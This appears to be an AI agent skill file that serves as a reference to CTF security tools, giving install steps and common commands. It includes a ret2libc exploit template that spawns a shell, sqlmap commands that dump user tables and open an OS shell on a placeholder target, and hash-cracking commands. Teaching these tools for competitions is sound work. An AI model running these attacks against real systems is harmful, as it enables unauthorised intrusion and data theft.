---
name: ctf-toolkit
description: "CTF tool reference skill. When user mentions CTF tools, pwntools, Ghidra, IDA Pro, Burp Suite, John the Ripper, hashcat, binwalk, Wireshark, tshark, CyberChef, gdb, pwndbg, nmap, sqlmap, or CTF tool setup and usage. Covers all essential CTF tools with installation, common commands, usage patterns, and tool selection guidance."
---

# CTF Toolkit — Essential Tools Reference

This skill covers tool selection, installation, and usage for CTF competitions.

---

## Tool Selection Matrix

```
TASK                          → PRIMARY TOOL        → ALTERNATIVE
══════════════════════════════════════════════════════════════════════
Web exploitation              → Burp Suite           → curl, ffuf
SQL injection                 → sqlmap              → manual payloads
XSS testing                   → dalfox              → XSStrike
Directory fuzzing             → ffuf                → gobuster, dirsearch
Binary analysis               → Ghidra/IDA          → radare2
Binary exploitation           → pwntools            → ROPgadget
Debugging                     → gdb + pwndbg        → gef
Reverse engineering           → Ghidra              → IDA Free
Memory forensics              → volatility          → rekall
Network analysis              → Wireshark/tshark    → tcpdump
Steganography                 → zsteg/stegsolve     → steghide
Password cracking             → hashcat             → john
Firmware analysis             → binwalk             → firmware-mod-kit
Data transformation           → CyberChef           → Python
Port scanning                 → nmap                → masscan
Cryptanalysis                 → SageMath            → Python (pycryptodome)
Encoding/decoding             → CyberChef           → Python
```

---

## pwntools (Python Exploitation Library)

### Installation
```bash
pip install pwntools
```

### Basic Usage
```python
from pwn import *

# Local process
p = process('./binary')

# Remote
p = remote('challenge.ctf.com', 1337)

# ELF
elf = ELF('./binary')
print(hex(elf.symbols['main']))
print(hex(elf.got['puts']))
print(hex(elf.plt['puts']))

# libc
libc = ELF('./libc.so.6')
print(hex(libc.symbols['system']))
print(hex(libc.symbols['puts']))

# Send/receive
p.sendline(b'payload')
p.send(b'payload')
data = p.recvline()
data = p.recvuntil(b'flag:')
data = p.recvn(100)

# ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
payload = b'A' * offset + rop.chain()

# FmtStr
fmt = FmtStr(execute_fmt=execute_fmt)
fmt.write(elf.got['puts'], elf.symbols['main'])
fmt.execute_writes()
```

### Common Patterns
```python
# Leak and exploit
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('./libc.so.6')
p = process('./vulnerable')

# Leak libc
pop_rdi = 0x401234
ret = 0x401016

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

# Second stage
payload = b'A' * 40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
```

---

## Ghidra (Reverse Engineering)

### Installation
```bash
# Download from https://ghidra-sre.org/
# Requires Java 17+

# Linux
unzip ghidra_*.zip
./ghidra_*/ghidraRun

# Windows
# Run ghidra.bat
```

### Workflow
```
1. Import binary
   File → Import File → Select binary

2. Auto-analyze
   Analysis → Auto Analysis

3. Find main
   Window → Symbol Tree → Functions → main

4. Decompile
   Double-click function → decompiler shows C

5. Rename/Type
   Right-click → Rename/Retype

6. Cross-references
   Right-click → References → Find References
```

### Keyboard Shortcuts
```
Ctrl+E: Export function
G: Go to address
X: Cross-references
;: Add comment
L: Rename label
F5: Decompile (Hex-Rays in IDA)
```

### Useful Scripts
```python
# Find XOR patterns
# Search → For Scalars → Search for constant 0x5A

# Find string references
# Right-click string → References → Find References

# Patch binary
# Right-click instruction → Patch Instruction
```

---

## IDA Pro (Reverse Engineering)

### Installation
```
# Commercial software
# IDA Free available at https://hex-rays.com/ida-free/
# Requires license for full features

# Windows
# Run ida64.exe or ida.exe

# Linux
./idat64
```

### Workflow
```
1. Load binary
   File → Open → Select binary

2. Wait for analysis

3. Find main
   Functions window → search "main"

4. Graph view
   Space bar (toggle graph/listing)

5. Rename
   N key → rename

6. Decompile
   F5 (Hex-Rays)
```

### Keyboard Shortcuts
```
Space: Toggle graph/listing
N: Rename
;: Add comment
X: Cross-references
G: Go to address
F5: Decompile
Alt+T: Text search
```

### IDAPython
```python
import idaapi, idautils, idc

# List functions
for func in idautils.Functions():
    print(hex(func), idc.get_func_name(func))

# Find XOR patterns
for addr in idautils.CodeRefsTo(0x401000, 0):
    if idc.get_operand_value(addr, 1) == 0x5A:
        print(f"XOR at {hex(addr)}")
```

---

## Burp Suite (Web Testing)

### Installation
```bash
# Download from https://portswigger.net/burp
# Community edition is free

# Linux
java -jar burpsuite_community.jar

# Windows
# Run burpsuite.exe
```

### Usage
```
1. Configure browser proxy (127.0.0.1:8080)
2. Install Burp CA certificate
3. Browse target application
4. Check HTTP history
5. Send interesting requests to Repeater
6. Test with Intruder for automation
```

### Key Features
```
Proxy:     Intercept and modify traffic
Repeater:  Manual request testing
Intruder:  Automated fuzzing
Decoder:   Encoding/decoding
Comparer:  Compare responses
Logger:    Request history
```

### Common Commands
```bash
# Start with custom config
java -jar burpsuite_community.jar --project-file=myproject

# Headless mode
java -jar burpsuite_community.jar --headless
```

---

## John the Ripper (Password Cracking)

### Installation
```bash
# Linux
sudo apt install john

# Or compile from source
git clone https://github.com/magnumripper/JohnTheRipper.git
cd JohnTheRipper/src
./configure && make
```

### Common Commands
```bash
# Crack MD5
john --format=raw-md5 hashes.txt

# Crack NTLM
john --format=nt hashes.txt

# Crack with wordlist
john --wordlist=rockyou.txt hashes.txt

# Crack with rules
john --wordlist=rockyou.txt --rules hashes.txt

# Show cracked
john --show hashes.txt

# Identify hash type
john --list=formats | grep -i hash
```

### Hash Formats
```bash
# List all formats
john --list=formats

# Common formats
--format=raw-md5
--format=raw-sha1
--format=raw-sha256
--format=nt
--format=lm
--format=bcrypt
```

---

## hashcat (Password Cracking)

### Installation
```bash
# Linux
sudo apt install hashcat

# Or download from https://hashcat.net/hashcat/
```

### Common Commands
```bash
# Crack MD5
hashcat -m 0 hashes.txt rockyou.txt

# Crack NTLM
hashcat -m 1000 hashes.txt rockyou.txt

# Crack SHA256
hashcat -m 1400 hashes.txt rockyou.txt

# Show cracked
hashcat -m 0 hashes.txt --show

# List hash types
hashcat --example-hashes | grep -A 3 "Hash mode"

# Common modes
-m 0     → MD5
-m 100    → SHA1
-m 1400   → SHA256
-m 1000   → NTLM
-m 3200   → bcrypt
```

---

## binwalk (Firmware Analysis)

### Installation
```bash
sudo apt install binwalk
```

### Common Commands
```bash
# Scan file
binwalk firmware.bin

# Extract files
binwalk -e firmware.bin

# Extract with depth
binwalk -eM firmware.bin

# Compare files
binwalk --diff file1.bin file2.bin

# Entropy analysis
binwalk -E firmware.bin
```

---

## Wireshark/tshark (Network Analysis)

### Installation
```bash
sudo apt install wireshark tshark
```

### tshark Commands
```bash
# Basic capture analysis
tshark -r capture.pcap

# HTTP requests
tshark -r capture.pcap -Y "http" -T fields -e http.request.full_uri

# DNS queries
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# Follow TCP stream
tshark -r capture.pcap -z "follow,tcp,raw,0"

# Export objects
tshark -r capture.pcap --export-objects http,exported_files

# Statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z http,tree

# Filter examples
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"
tshark -r capture.pcap -Y "tcp.port == 80"
tshark -r capture.pcap -Y "http contains flag"
```

---

## CyberChef (Data Transformation)

### Usage
```bash
# Online: https://gchq.github.io/CyberChef/
# Local: Download from https://github.com/gchq/CyberChef

# Run locally
python3 -m CyberChef
```

### Common Recipes
```
FROM BASE64:       Decode Base64
TO BASE64:         Encode Base64
FROM HEX:          Decode hex
TO HEX:            Encode hex
ROT13:             ROT13 cipher
GUNZIP:            Decompress gzip
BZ2 DECOMPRESS:    Decompress bzip2
XOR:               XOR operation
AES DECRYPT:       AES decryption
REGEX:             Regular expression
REPLACE:           Find and replace
SPLIT:             Split string
MERGE:             Merge strings
MAGIC:             Auto-detect encoding
```

### CyberChef Tips
```
# Auto-detect encodings
Use "Magic" recipe

# Chain operations
Drag recipes from left panel to Recipe panel

# Save recipes
Click "Save recipe" to export

# Load from URL
Share recipe via URL
```

---

## gdb + pwndbg (Debugging)

### Installation
```bash
# gdb
sudo apt install gdb

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

### Common Commands
```bash
# Start
gdb ./binary
pwndbg ./binary

# Breakpoints
b *0x4011b0
b main

# Run
r
r < input.txt
r <<< "AAAA"

# Examine
x/20x $rsp          # Examine stack
x/s 0x404040        # Examine string
x/10i $rip          # Disassemble
info functions       # List functions

# Heap
heap chunks          # List heap chunks
heap bins            # List free bins

# Info
info registers       # All registers
info proc mappings   # Memory mappings
vmmap               # Virtual memory map

# Pattern
pattern create 200
pattern search

# GOT/PLT
got                  # GOT entries
plt                  # PLT entries

# One-gadget
one_gadget libc.so.6
```

### pwndbg Features
```
pwndbg> context        # Show registers, stack, code
pwndbg> heap           # Heap analysis
pwndbg> vis_heap       # Visual heap
pwndbg> got            # GOT entries
pwndbg> plt            # PLT entries
pwndbg> find /bin/sh   # Search memory
pwndbg> search -s flag # Search for string
```

---

## nmap (Port Scanning)

### Installation
```bash
sudo apt install nmap
```

### Common Commands
```bash
# Basic scan
nmap target.com

# Full port scan
nmap -p- target.com

# Service detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Script scan
nmap --script=default target.com

# Vulnerability scan
nmap --script=vuln target.com

# Common scripts
nmap --script=http-enum target.com
nmap --script=http-sql-injection target.com
nmap --script=ssl-enum-ciphers target.com

# Output formats
nmap -oA output target.com
nmap -oX output.xml target.com
nmap -oG output.grep target.com
```

---

## sqlmap (SQL Injection)

### Installation
```bash
sudo apt install sqlmap
```

### Common Commands
```bash
# Basic detection
sqlmap -u "http://target.com/?id=1" --batch

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Enumerate databases
sqlmap -u "http://target.com/?id=1" --dbs --batch

# Dump table
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump --batch

# OS shell
sqlmap -u "http://target.com/?id=1" --os-shell --batch

# Custom headers/cookies
sqlmap -u "http://target.com/?id=1" --cookie="session=abc" --headers="X-Auth: token" --batch

# Tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment --batch

# Risk/level
sqlmap -u "http://target.com/?id=1" --risk=3 --level=5 --batch
```

---

## Tool Installation Quick Reference

```bash
# pwntools
pip install pwntools

# Ghidra
# Download from https://ghidra-sre.org/

# IDA Free
# Download from https://hex-rays.com/ida-free/

# Burp Suite
# Download from https://portswigger.net/burp

# John the Ripper
sudo apt install john

# hashcat
sudo apt install hashcat

# binwalk
sudo apt install binwalk

# Wireshark/tshark
sudo apt install wireshark tshark

# CyberChef
# Online: https://gchq.github.io/CyberChef/

# gdb + pwndbg
sudo apt install gdb
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# nmap
sudo apt install nmap

# sqlmap
sudo apt install sqlmap

# ROPgadget
pip install ROPGadget

# ropper
pip install ropper

# zsteg
gem install zsteg

# steghide
sudo apt install steghide

# stegsolve
# Download from https://www.caesum.com/handbook/

# exiftool
sudo apt install libimage-exiftool-perl

# CyberChef
# Online or download from GitHub
```

---

## Tool Priority by Category

```
WEB:    Burp Suite → sqlmap → ffuf → curl
CRYPTO: Python (pycryptodome) → SageMath → CyberChef
PWN:    pwntools → gdb+pwndbg → ROPgadget → one_gadget
REV:    Ghidra → IDA → radare2 → strings
FORENSICS: volatility → tshark → binwalk → exiftool → zsteg
MISC:   CyberChef → Python → Google
```

---

**Remember:** Tools are force multipliers. Know your tools before the competition. Practice with them regularly. Have backups installed. The right tool can turn a 2-hour challenge into a 2-minute solution.
